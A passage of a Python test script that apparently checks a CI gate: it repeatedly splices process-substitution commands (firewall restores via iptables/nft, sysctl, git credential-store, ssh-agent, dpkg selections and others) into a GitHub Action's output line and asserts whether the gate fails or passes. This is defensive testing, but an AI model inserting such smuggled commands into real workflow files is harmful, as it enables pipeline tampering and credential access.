        periksa("sqlite3 berkas.db 'select 1': gerbang lolos (Audit 1175)", rc == 0)
        shutil.rmtree(sub377, ignore_errors=True)
        sub378 = klon(tmp, "sub378")
        berkas_aksi378 = os.path.join(
            sub378, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi378, encoding="utf-8") as f:
            isi_aksi378 = f.read()
        baris_aksi378 = [b for b in isi_aksi378.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru378 = isi_aksi378.replace(
                baris_aksi378,
                baris_aksi378.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(grep --group-separator SEP pola; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru378 != isi_aksi378, \
            "suntikan aksi378 tidak menembak"
        with open(berkas_aksi378, "w", encoding="utf-8") as f:
            f.write(isi_baru378)
        rc, out = jalan(sub378,
                        [sys.executable, GERBANG, "--semua"])
        periksa("grep --group-separator SEP pola: gerbang gagal (Audit 1176)", rc != 0)
        shutil.rmtree(sub378, ignore_errors=True)
        sub379 = klon(tmp, "sub379")
        berkas_aksi379 = os.path.join(
            sub379, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi379, encoding="utf-8") as f:
            isi_aksi379 = f.read()
        baris_aksi379 = [b for b in isi_aksi379.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru379 = isi_aksi379.replace(
                baris_aksi379,
                baris_aksi379.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -t --help; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru379 != isi_aksi379, \
            "suntikan aksi379 tidak menembak"
        with open(berkas_aksi379, "w", encoding="utf-8") as f:
            f.write(isi_baru379)
        rc, out = jalan(sub379,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -t --help: gerbang lolos (Audit 1180)", rc == 0)
        shutil.rmtree(sub379, ignore_errors=True)
        sub380 = klon(tmp, "sub380")
        berkas_aksi380 = os.path.join(
            sub380, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi380, encoding="utf-8") as f:
            isi_aksi380 = f.read()
        baris_aksi380 = [b for b in isi_aksi380.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru380 = isi_aksi380.replace(
                baris_aksi380,
                baris_aksi380.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(more -f --help; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru380 != isi_aksi380, \
            "suntikan aksi380 tidak menembak"
        with open(berkas_aksi380, "w", encoding="utf-8") as f:
            f.write(isi_baru380)
        rc, out = jalan(sub380,
                        [sys.executable, GERBANG, "--semua"])
        periksa("more -f --help: gerbang lolos (Audit 1180)", rc == 0)
        shutil.rmtree(sub380, ignore_errors=True)
        sub381 = klon(tmp, "sub381")
        berkas_aksi381 = os.path.join(
            sub381, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi381, encoding="utf-8") as f:
            isi_aksi381 = f.read()
        baris_aksi381 = [b for b in isi_aksi381.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru381 = isi_aksi381.replace(
                baris_aksi381,
                baris_aksi381.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sqlite3 -init --help contoh.db; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru381 != isi_aksi381, \
            "suntikan aksi381 tidak menembak"
        with open(berkas_aksi381, "w", encoding="utf-8") as f:
            f.write(isi_baru381)
        rc, out = jalan(sub381,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sqlite3 -init --help contoh.db: gerbang gagal (Audit 1181)", rc != 0)
        shutil.rmtree(sub381, ignore_errors=True)
        sub382 = klon(tmp, "sub382")
        berkas_aksi382 = os.path.join(
            sub382, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi382, encoding="utf-8") as f:
            isi_aksi382 = f.read()
        baris_aksi382 = [b for b in isi_aksi382.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru382 = isi_aksi382.replace(
                baris_aksi382,
                baris_aksi382.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(expect -c 'puts x' -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru382 != isi_aksi382, \
            "suntikan aksi382 tidak menembak"
        with open(berkas_aksi382, "w", encoding="utf-8") as f:
            f.write(isi_baru382)
        rc, out = jalan(sub382,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect -c 'puts x' -: gerbang gagal (Audit 1182)", rc != 0)
        shutil.rmtree(sub382, ignore_errors=True)
        sub383 = klon(tmp, "sub383")
        berkas_aksi383 = os.path.join(
            sub383, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi383, encoding="utf-8") as f:
            isi_aksi383 = f.read()
        baris_aksi383 = [b for b in isi_aksi383.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru383 = isi_aksi383.replace(
                baris_aksi383,
                baris_aksi383.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tclsh8.6 -encoding utf-8; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru383 != isi_aksi383, \
            "suntikan aksi383 tidak menembak"
        with open(berkas_aksi383, "w", encoding="utf-8") as f:
            f.write(isi_baru383)
        rc, out = jalan(sub383,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tclsh8.6 -encoding utf-8: gerbang gagal (Audit 1183)", rc != 0)
        shutil.rmtree(sub383, ignore_errors=True)
        sub384 = klon(tmp, "sub384")
        berkas_aksi384 = os.path.join(
            sub384, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi384, encoding="utf-8") as f:
            isi_aksi384 = f.read()
        baris_aksi384 = [b for b in isi_aksi384.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru384 = isi_aksi384.replace(
                baris_aksi384,
                baris_aksi384.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git column --indent xx; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru384 != isi_aksi384, \
            "suntikan aksi384 tidak menembak"
        with open(berkas_aksi384, "w", encoding="utf-8") as f:
            f.write(isi_baru384)
        rc, out = jalan(sub384,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git column --indent xx: gerbang gagal (Audit 1184)", rc != 0)
        shutil.rmtree(sub384, ignore_errors=True)
        sub385 = klon(tmp, "sub385")
        berkas_aksi385 = os.path.join(
            sub385, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi385, encoding="utf-8") as f:
            isi_aksi385 = f.read()
        baris_aksi385 = [b for b in isi_aksi385.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru385 = isi_aksi385.replace(
                baris_aksi385,
                baris_aksi385.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git check-mailmap; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru385 != isi_aksi385, \
            "suntikan aksi385 tidak menembak"
        with open(berkas_aksi385, "w", encoding="utf-8") as f:
            f.write(isi_baru385)
        rc, out = jalan(sub385,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git check-mailmap: gerbang lolos (Audit 1185)", rc == 0)
        shutil.rmtree(sub385, ignore_errors=True)
        sub386 = klon(tmp, "sub386")
        berkas_aksi386 = os.path.join(
            sub386, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi386, encoding="utf-8") as f:
            isi_aksi386 = f.read()
        baris_aksi386 = [b for b in isi_aksi386.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru386 = isi_aksi386.replace(
                baris_aksi386,
                baris_aksi386.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git credential-store; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru386 != isi_aksi386, \
            "suntikan aksi386 tidak menembak"
        with open(berkas_aksi386, "w", encoding="utf-8") as f:
            f.write(isi_baru386)
        rc, out = jalan(sub386,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git credential-store: gerbang lolos (Audit 1186)", rc == 0)
        shutil.rmtree(sub386, ignore_errors=True)
        sub387 = klon(tmp, "sub387")
        berkas_aksi387 = os.path.join(
            sub387, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi387, encoding="utf-8") as f:
            isi_aksi387 = f.read()
        baris_aksi387 = [b for b in isi_aksi387.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru387 = isi_aksi387.replace(
                baris_aksi387,
                baris_aksi387.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -t -f - -T; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru387 != isi_aksi387, \
            "suntikan aksi387 tidak menembak"
        with open(berkas_aksi387, "w", encoding="utf-8") as f:
            f.write(isi_baru387)
        rc, out = jalan(sub387,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -t -f - -T: gerbang lolos (Audit 1187)", rc == 0)
        shutil.rmtree(sub387, ignore_errors=True)
        sub388 = klon(tmp, "sub388")
        berkas_aksi388 = os.path.join(
            sub388, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi388, encoding="utf-8") as f:
            isi_aksi388 = f.read()
        baris_aksi388 = [b for b in isi_aksi388.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru388 = isi_aksi388.replace(
                baris_aksi388,
                baris_aksi388.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -t --files-from=; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru388 != isi_aksi388, \
            "suntikan aksi388 tidak menembak"
        with open(berkas_aksi388, "w", encoding="utf-8") as f:
            f.write(isi_baru388)
        rc, out = jalan(sub388,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar -t --files-from=: gerbang lolos (Audit 1188)", rc == 0)
        shutil.rmtree(sub388, ignore_errors=True)
        sub389 = klon(tmp, "sub389")
        berkas_aksi389 = os.path.join(
            sub389, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi389, encoding="utf-8") as f:
            isi_aksi389 = f.read()
        baris_aksi389 = [b for b in isi_aksi389.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru389 = isi_aksi389.replace(
                baris_aksi389,
                baris_aksi389.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(prlimit --pid 1 cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru389 != isi_aksi389, \
            "suntikan aksi389 tidak menembak"
        with open(berkas_aksi389, "w", encoding="utf-8") as f:
            f.write(isi_baru389)
        rc, out = jalan(sub389,
                        [sys.executable, GERBANG, "--semua"])
        periksa("prlimit --pid 1 cat: gerbang lolos (Audit 1189)", rc == 0)
        shutil.rmtree(sub389, ignore_errors=True)
        sub390 = klon(tmp, "sub390")
        berkas_aksi390 = os.path.join(
            sub390, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi390, encoding="utf-8") as f:
            isi_aksi390 = f.read()
        baris_aksi390 = [b for b in isi_aksi390.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru390 = isi_aksi390.replace(
                baris_aksi390,
                baris_aksi390.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(funzip; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru390 != isi_aksi390, \
            "suntikan aksi390 tidak menembak"
        with open(berkas_aksi390, "w", encoding="utf-8") as f:
            f.write(isi_baru390)
        rc, out = jalan(sub390,
                        [sys.executable, GERBANG, "--semua"])
        periksa("funzip: gerbang gagal (Audit 1191)", rc != 0)
        shutil.rmtree(sub390, ignore_errors=True)
        sub391 = klon(tmp, "sub391")
        berkas_aksi391 = os.path.join(
            sub391, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi391, encoding="utf-8") as f:
            isi_aksi391 = f.read()
        baris_aksi391 = [b for b in isi_aksi391.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru391 = isi_aksi391.replace(
                baris_aksi391,
                baris_aksi391.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(json_pp; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru391 != isi_aksi391, \
            "suntikan aksi391 tidak menembak"
        with open(berkas_aksi391, "w", encoding="utf-8") as f:
            f.write(isi_baru391)
        rc, out = jalan(sub391,
                        [sys.executable, GERBANG, "--semua"])
        periksa("json_pp: gerbang gagal (Audit 1192)", rc != 0)
        shutil.rmtree(sub391, ignore_errors=True)
        sub392 = klon(tmp, "sub392")
        berkas_aksi392 = os.path.join(
            sub392, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi392, encoding="utf-8") as f:
            isi_aksi392 = f.read()
        baris_aksi392 = [b for b in isi_aksi392.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru392 = isi_aksi392.replace(
                baris_aksi392,
                baris_aksi392.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(pdftotext - -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru392 != isi_aksi392, \
            "suntikan aksi392 tidak menembak"
        with open(berkas_aksi392, "w", encoding="utf-8") as f:
            f.write(isi_baru392)
        rc, out = jalan(sub392,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pdftotext - -: gerbang gagal (Audit 1193)", rc != 0)
        shutil.rmtree(sub392, ignore_errors=True)
        sub393 = klon(tmp, "sub393")
        berkas_aksi393 = os.path.join(
            sub393, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi393, encoding="utf-8") as f:
            isi_aksi393 = f.read()
        baris_aksi393 = [b for b in isi_aksi393.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru393 = isi_aksi393.replace(
                baris_aksi393,
                baris_aksi393.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(newgrp; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru393 != isi_aksi393, \
            "suntikan aksi393 tidak menembak"
        with open(berkas_aksi393, "w", encoding="utf-8") as f:
            f.write(isi_baru393)
        rc, out = jalan(sub393,
                        [sys.executable, GERBANG, "--semua"])
        periksa("newgrp: gerbang gagal (Audit 1194)", rc != 0)
        shutil.rmtree(sub393, ignore_errors=True)
        sub394 = klon(tmp, "sub394")
        berkas_aksi394 = os.path.join(
            sub394, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi394, encoding="utf-8") as f:
            isi_aksi394 = f.read()
        baris_aksi394 = [b for b in isi_aksi394.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru394 = isi_aksi394.replace(
                baris_aksi394,
                baris_aksi394.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nft -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru394 != isi_aksi394, \
            "suntikan aksi394 tidak menembak"
        with open(berkas_aksi394, "w", encoding="utf-8") as f:
            f.write(isi_baru394)
        rc, out = jalan(sub394,
                        [sys.executable, GERBANG, "--semua"])
        periksa("nft -f -: gerbang gagal (Audit 1195)", rc != 0)
        shutil.rmtree(sub394, ignore_errors=True)
        sub395 = klon(tmp, "sub395")
        berkas_aksi395 = os.path.join(
            sub395, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi395, encoding="utf-8") as f:
            isi_aksi395 = f.read()
        baris_aksi395 = [b for b in isi_aksi395.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru395 = isi_aksi395.replace(
                baris_aksi395,
                baris_aksi395.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(iptables-restore; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru395 != isi_aksi395, \
            "suntikan aksi395 tidak menembak"
        with open(berkas_aksi395, "w", encoding="utf-8") as f:
            f.write(isi_baru395)
        rc, out = jalan(sub395,
                        [sys.executable, GERBANG, "--semua"])
        periksa("iptables-restore: gerbang gagal (Audit 1196)", rc != 0)
        shutil.rmtree(sub395, ignore_errors=True)
        sub396 = klon(tmp, "sub396")
        berkas_aksi396 = os.path.join(
            sub396, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi396, encoding="utf-8") as f:
            isi_aksi396 = f.read()
        baris_aksi396 = [b for b in isi_aksi396.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru396 = isi_aksi396.replace(
                baris_aksi396,
                baris_aksi396.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ip6tables-restore --table filter; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru396 != isi_aksi396, \
            "suntikan aksi396 tidak menembak"
        with open(berkas_aksi396, "w", encoding="utf-8") as f:
            f.write(isi_baru396)
        rc, out = jalan(sub396,
                        [sys.executable, GERBANG, "--semua"])
        periksa("ip6tables-restore --table filter: gerbang gagal (Audit 1196)", rc != 0)
        shutil.rmtree(sub396, ignore_errors=True)
        sub397 = klon(tmp, "sub397")
        berkas_aksi397 = os.path.join(
            sub397, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi397, encoding="utf-8") as f:
            isi_aksi397 = f.read()
        baris_aksi397 = [b for b in isi_aksi397.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru397 = isi_aksi397.replace(
                baris_aksi397,
                baris_aksi397.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ip -batch -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru397 != isi_aksi397, \
            "suntikan aksi397 tidak menembak"
        with open(berkas_aksi397, "w", encoding="utf-8") as f:
            f.write(isi_baru397)
        rc, out = jalan(sub397,
                        [sys.executable, GERBANG, "--semua"])
        periksa("ip -batch -: gerbang gagal (Audit 1197)", rc != 0)
        shutil.rmtree(sub397, ignore_errors=True)
        sub398 = klon(tmp, "sub398")
        berkas_aksi398 = os.path.join(
            sub398, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi398, encoding="utf-8") as f:
            isi_aksi398 = f.read()
        baris_aksi398 = [b for b in isi_aksi398.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru398 = isi_aksi398.replace(
                baris_aksi398,
                baris_aksi398.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tc -batch daftar.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru398 != isi_aksi398, \
            "suntikan aksi398 tidak menembak"
        with open(berkas_aksi398, "w", encoding="utf-8") as f:
            f.write(isi_baru398)
        rc, out = jalan(sub398,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tc -batch daftar.txt: gerbang lolos (Audit 1197)", rc == 0)
        shutil.rmtree(sub398, ignore_errors=True)
        sub399 = klon(tmp, "sub399")
        berkas_aksi399 = os.path.join(
            sub399, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi399, encoding="utf-8") as f:
            isi_aksi399 = f.read()
        baris_aksi399 = [b for b in isi_aksi399.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru399 = isi_aksi399.replace(
                baris_aksi399,
                baris_aksi399.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(dpkg --set-selections; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru399 != isi_aksi399, \
            "suntikan aksi399 tidak menembak"
        with open(berkas_aksi399, "w", encoding="utf-8") as f:
            f.write(isi_baru399)
        rc, out = jalan(sub399,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dpkg --set-selections: gerbang gagal (Audit 1198)", rc != 0)
        shutil.rmtree(sub399, ignore_errors=True)
        sub400 = klon(tmp, "sub400")
        berkas_aksi400 = os.path.join(
            sub400, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi400, encoding="utf-8") as f:
            isi_aksi400 = f.read()
        baris_aksi400 = [b for b in isi_aksi400.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru400 = isi_aksi400.replace(
                baris_aksi400,
                baris_aksi400.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(lzcat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru400 != isi_aksi400, \
            "suntikan aksi400 tidak menembak"
        with open(berkas_aksi400, "w", encoding="utf-8") as f:
            f.write(isi_baru400)
        rc, out = jalan(sub400,
                        [sys.executable, GERBANG, "--semua"])
        periksa("lzcat: gerbang gagal (Audit 1199)", rc != 0)
        shutil.rmtree(sub400, ignore_errors=True)
        sub401 = klon(tmp, "sub401")
        berkas_aksi401 = os.path.join(
            sub401, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi401, encoding="utf-8") as f:
            isi_aksi401 = f.read()
        baris_aksi401 = [b for b in isi_aksi401.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru401 = isi_aksi401.replace(
                baris_aksi401,
                baris_aksi401.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(file -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru401 != isi_aksi401, \
            "suntikan aksi401 tidak menembak"
        with open(berkas_aksi401, "w", encoding="utf-8") as f:
            f.write(isi_baru401)
        rc, out = jalan(sub401,
                        [sys.executable, GERBANG, "--semua"])
        periksa("file -: gerbang gagal (Audit 1200)", rc != 0)
        shutil.rmtree(sub401, ignore_errors=True)
        sub402 = klon(tmp, "sub402")
        berkas_aksi402 = os.path.join(
            sub402, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi402, encoding="utf-8") as f:
            isi_aksi402 = f.read()
        baris_aksi402 = [b for b in isi_aksi402.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru402 = isi_aksi402.replace(
                baris_aksi402,
                baris_aksi402.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(file -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru402 != isi_aksi402, \
            "suntikan aksi402 tidak menembak"
        with open(berkas_aksi402, "w", encoding="utf-8") as f:
            f.write(isi_baru402)
        rc, out = jalan(sub402,
                        [sys.executable, GERBANG, "--semua"])
        periksa("file -f -: gerbang gagal (Audit 1200)", rc != 0)
        shutil.rmtree(sub402, ignore_errors=True)
        sub403 = klon(tmp, "sub403")
        berkas_aksi403 = os.path.join(
            sub403, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi403, encoding="utf-8") as f:
            isi_aksi403 = f.read()
        baris_aksi403 = [b for b in isi_aksi403.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru403 = isi_aksi403.replace(
                baris_aksi403,
                baris_aksi403.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(date -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru403 != isi_aksi403, \
            "suntikan aksi403 tidak menembak"
        with open(berkas_aksi403, "w", encoding="utf-8") as f:
            f.write(isi_baru403)
        rc, out = jalan(sub403,
                        [sys.executable, GERBANG, "--semua"])
        periksa("date -f -: gerbang gagal (Audit 1201)", rc != 0)
        shutil.rmtree(sub403, ignore_errors=True)
        sub404 = klon(tmp, "sub404")
        berkas_aksi404 = os.path.join(
            sub404, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi404, encoding="utf-8") as f:
            isi_aksi404 = f.read()
        baris_aksi404 = [b for b in isi_aksi404.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru404 = isi_aksi404.replace(
                baris_aksi404,
                baris_aksi404.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sysctl -p -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru404 != isi_aksi404, \
            "suntikan aksi404 tidak menembak"
        with open(berkas_aksi404, "w", encoding="utf-8") as f:
            f.write(isi_baru404)
        rc, out = jalan(sub404,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sysctl -p -: gerbang gagal (Audit 1202)", rc != 0)
        shutil.rmtree(sub404, ignore_errors=True)
        sub405 = klon(tmp, "sub405")
        berkas_aksi405 = os.path.join(
            sub405, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi405, encoding="utf-8") as f:
            isi_aksi405 = f.read()
        baris_aksi405 = [b for b in isi_aksi405.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru405 = isi_aksi405.replace(
                baris_aksi405,
                baris_aksi405.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(ssh-agent cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru405 != isi_aksi405, \
            "suntikan aksi405 tidak menembak"
        with open(berkas_aksi405, "w", encoding="utf-8") as f:
            f.write(isi_baru405)
        rc, out = jalan(sub405,
                        [sys.executable, GERBANG, "--semua"])
        periksa("ssh-agent cat: gerbang gagal (Audit 1203)", rc != 0)
        shutil.rmtree(sub405, ignore_errors=True)
        sub406 = klon(tmp, "sub406")
        berkas_aksi406 = os.path.join(
            sub406, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi406, encoding="utf-8") as f:
            isi_aksi406 = f.read()
        baris_aksi406 = [b for b in isi_aksi406.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru406 = isi_aksi406.replace(
                baris_aksi406,
                baris_aksi406.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(bun repl; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru406 != isi_aksi406, \
            "suntikan aksi406 tidak menembak"
        with open(berkas_aksi406, "w", encoding="utf-8") as f:
            f.write(isi_baru406)
        rc, out = jalan(sub406,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bun repl: gerbang gagal (Audit 1204)", rc != 0)
        shutil.rmtree(sub406, ignore_errors=True)
        sub407 = klon(tmp, "sub407")
        berkas_aksi407 = os.path.join(
            sub407, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi407, encoding="utf-8") as f:
            isi_aksi407 = f.read()
        baris_aksi407 = [b for b in isi_aksi407.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru407 = isi_aksi407.replace(
                baris_aksi407,
                baris_aksi407.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(bun; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru407 != isi_aksi407, \
            "suntikan aksi407 tidak menembak"
        with open(berkas_aksi407, "w", encoding="utf-8") as f:
            f.write(isi_baru407)
        rc, out = jalan(sub407,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bun: gerbang lolos (Audit 1204)", rc == 0)
        shutil.rmtree(sub407, ignore_errors=True)
        sub408 = klon(tmp, "sub408")
        berkas_aksi408 = os.path.join(
            sub408, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi408, encoding="utf-8") as f:
            isi_aksi408 = f.read()
        baris_aksi408 = [b for b in isi_aksi408.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru408 = isi_aksi408.replace(
                baris_aksi408,
                baris_aksi408.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git am; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru408 != isi_aksi408, \
            "suntikan aksi408 tidak menembak"
        with open(berkas_aksi408, "w", encoding="utf-8") as f:
            f.write(isi_baru408)
        rc, out = jalan(sub408,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git am: gerbang gagal (Audit 1205)", rc != 0)
        shutil.rmtree(sub408, ignore_errors=True)
        sub409 = klon(tmp, "sub409")
        berkas_aksi409 = os.path.join(
            sub409, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi409, encoding="utf-8") as f:
            isi_aksi409 = f.read()
        baris_aksi409 = [b for b in isi_aksi409.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru409 = isi_aksi409.replace(
                baris_aksi409,
                baris_aksi409.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git shortlog; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru409 != isi_aksi409, \
            "suntikan aksi409 tidak menembak"
        with open(berkas_aksi409, "w", encoding="utf-8") as f:
            f.write(isi_baru409)
        rc, out = jalan(sub409,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git shortlog: gerbang gagal (Audit 1205)", rc != 0)
        shutil.rmtree(sub409, ignore_errors=True)
        sub410 = klon(tmp, "sub410")
        berkas_aksi410 = os.path.join(
            sub410, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi410, encoding="utf-8") as f:
            isi_aksi410 = f.read()
        baris_aksi410 = [b for b in isi_aksi410.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru410 = isi_aksi410.replace(
                baris_aksi410,
                baris_aksi410.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git update-ref --stdin; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru410 != isi_aksi410, \
